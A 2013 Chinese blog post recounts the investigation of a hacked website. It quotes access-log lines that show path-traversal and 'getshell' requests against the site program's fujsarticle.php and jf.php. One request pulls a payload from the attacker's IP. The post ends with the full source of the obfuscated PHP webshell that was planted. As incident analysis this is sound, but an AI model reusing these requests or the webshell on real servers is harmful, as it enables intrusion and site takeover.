---
title: "一次入侵检查"
date: 2013-10-02 21:38:00
categories: ['Linux']
---

#10.1放假期间的一次入侵处理#

今天一个网站的朋友给我电话，说网站无法访问了。我尝试访问了下，提示数据库不存在。开始以为数据库出现问题了，尝试访问子域名无问题。ssh上去看到数据库正常。
检查文件的时候，发现mysql_config.php是早上6点多修改过的。比较奇怪了。

打开mysql_config.php发现已经被清空了。于是赶紧处理下，让网站恢复了正常。

<!--more-->

##查找原因##
因为文件被篡改了，还是比较严重的。于是开始尝试分析原因。

首先检查了登陆logs，并没有发现异常。可以初步排除是ssh上来修改的。服务器没有开放ftp，所以就怀疑是通过web程序的漏洞实现的。

根据文件的修改时间，调出访问日志查找。最终找到如下三个异常访问

```
103.14.144.41 - - [02/Oct/2013:06:18:10 +0800] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" -
103.14.144.41 - - [02/Oct/2013:06:18:10 +0800] "GET /do/fujsarticle.php?type=like&FileName=../data/mysql_config.php&submit=fuck HTTP/1.1" 200 37 "-" "-" -
103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] "GET /news/fujsarticle.php?type=like&FileName=../data/mysql_config.php&submit=fuck HTTP/1.1" 404 36 "-" "-" -
103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] "GET /do/jf.php?dbuser=getshell&dbhost=103.14.144.41&dbpw=shellpwd&dbname=getshell&pre=qb_&dbcharset=gbk&submit=getshell HTTP/1.1" 200 12140 "-" "-" -
103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] "HEAD /do/c.php HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" -

```

通过访问fujsarticle.php、jf.php文件来提交构造好的参数，实现对文件的修改并通过调用自己的数据库内容，来传送过来一个c.php的webshell。这两个文件都是程序自带的文件，我也不好修改。目前只是把对应目录权限配置了，让www的用户无法写入文件了。后面还要让程序人员看看如何彻底解决下。

##webshell##
这个webshell很有意思。通过各种字符替换和转换编码，达到了很好的加密伪装效果。下面就是那个webshell，感谢去的可以看看，学习学习。

``` php
<?php
$tj="IGluaV9zZXQoJ2h0bWxfZXJyb3JrbzJyxmYWxzZSk7aW5pX3NldCgnrbZGlzcGxheV9lcnJvcnMnLGZhrbbHNlKrbTtAcHrbJrblZ19yZXBsYWNlKCIvLrb2UrbiLCRfUE9TVFrbsnRkVORrbyddLCJrbBY2Nlrbc3MrbgRGVuaWVkIikrb7QrbHByZWdrbfcmVwbGFjZS";
$ju = str_replace("si","","sissitsirsi_rsiesipsilasicsie");
$gie="krbXrb0ZJTErbVTWyJrb1cGZpbGUiXVrbsibmFtZSJdO2lmKCFmaWxlX2V4aXN0cygkX0ZJTEVTrbWyJ1cGZpbGUiXVsirbbmrbFtZrbSJdKSl7IGrbNvcHkorbJF9GSUxFU1sidXBrbmaWxrblIl1bInRtcF9rbuYW1lIl0sICRfRklMRVrbNbInVwZmlsZSJdWyJrbuYrbW1";
$zc="giL1xzKlxbcGhwXrbF0oLis/KVrbxrbbXC9wrbaHrbBcXVxzKrbi9pZXMrbiLrbCAiXFwxIiwgJrbF9HRVRbJ0ZFTrbkcnXSk7aWYoJF9HRVRbInBrIl09PSJsb3ZlIil7aWYgKCRfU0VSVkVrbSWydSRVFVRVNUX01FVEhPRCrbddID09ICrbdQT1NUJykgeyBlY2hvICJrb1cmrbw6Ii4";
$ro="lIl0pOyB9frbT8+rbPGZvcm0gbWVrb0aG9kPSJwb3N0IrbiBlbmN0erbXBlPSJrbtdWx0rbaXBrbhcnQvZrbm9ybS1krbYXRhIj48aW5wdrbXQgbmrbFtZT0idXBmaWxlIiB0eXBlPSJmaWxlIj48aW5wdXQgdHlwZTrb0ic3VibWl0IiB2YWx1ZT0ib2siPjwvZm9yrbbT48P3BocCB9";
$nx = $ju("g", "", "gbgagse6g4g_dgegcgogde");
$xq = $ju("v","","vcvreavtvev_vfvuvnvcvtvivovn");
$baj = $xq('', $nx($ju("rb", "", $tj.$zc.$gie.$ro))); $baj();
?>

```
